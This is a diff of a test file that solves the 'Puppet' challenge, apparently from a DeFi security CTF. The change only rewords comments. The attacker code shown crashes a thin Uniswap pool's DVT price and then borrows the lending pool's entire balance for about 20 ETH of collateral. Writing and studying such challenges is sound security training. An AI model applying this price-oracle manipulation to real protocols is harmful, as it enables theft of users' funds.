@@ -122,14 +122,14 @@ describe('[Challenge] Puppet', function () {
 		await this.token.connect(attacker).approve(this.uniswapExchange.address, tokensSwapAmount)
 
 		// Execute function of Uniswap contract that allow to swap tokens with ETH.
-		// This will unbalance the ETH/TOKEN ratio:
-		// from [10/10 = 1] to  [0,099/1009 = 0.000098], and devaluate
-		// the price of DVT, so that the collateral needed for borrowing the 100.000 DVT
-		// becomes ~19 ETH (0.000098 * 100.000 * 2) instead of 200.000 ETH (1 * 100.000 * 2).
+		// This will unbalance the ETH/DVT ratio, and devaluate the price of DVT:
+		// from [10/10 = 1] to [0,099/1009 = 0.000098]
 		await this.uniswapExchange
 			.connect(attacker)
 			.tokenToEthSwapInput(tokensSwapAmount, ethers.utils.parseEther('9'), deadline)
 
+		// So, the collateral needed for borrowing the 100.000 DVT becomes
+		// ~19 ETH (0.000098 * 100.000 * 2) instead of 200.000 ETH (1 * 100.000 * 2).
 		await this.lendingPool
 			.connect(attacker)
 			.borrow(POOL_INITIAL_TOKEN_BALANCE, {value: ethers.utils.parseEther('20')})
